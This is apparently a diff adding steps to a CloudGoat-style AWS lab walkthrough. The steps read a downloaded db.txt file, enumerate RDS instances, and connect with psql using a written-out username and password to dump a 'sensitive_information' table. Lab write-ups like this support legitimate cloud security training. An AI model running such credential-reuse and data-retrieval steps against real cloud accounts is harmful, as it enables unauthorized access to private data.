@@ -1799,3 +1799,35 @@ aws s3 sync s3://<bucket-name> .
 <p align="center">
   <img src="/images/cloud/download_new_bucket.png">
 </p>
+
+* Read the _db.txt_ file as shown below.
+
+```bash
+cat db.txt
+```
+
+<p align="center">
+  <img src="/images/cloud/db_file.png">
+</p>
+
+* Enumerate RDS Instance Information.
+
+```bash
+aws rds describe-db-instances --region us-east-1
+```
+
+<p align="center">
+  <img src="/images/cloud/rds_info.png">
+</p>
+
+* Using **DB name,Username,Password and RDS Instance** try to connect via psql to retrive _sensitive information_.
+
+```bash
+psql postgresql://cgadmin:Purplepwny2029@<rds-instance>:5432/cloudgoat
+\dt
+select * from sensitive_information;
+```
+
+<p align="center">
+  <img src="/images/cloud/secret_mcduck.png">
+</p>
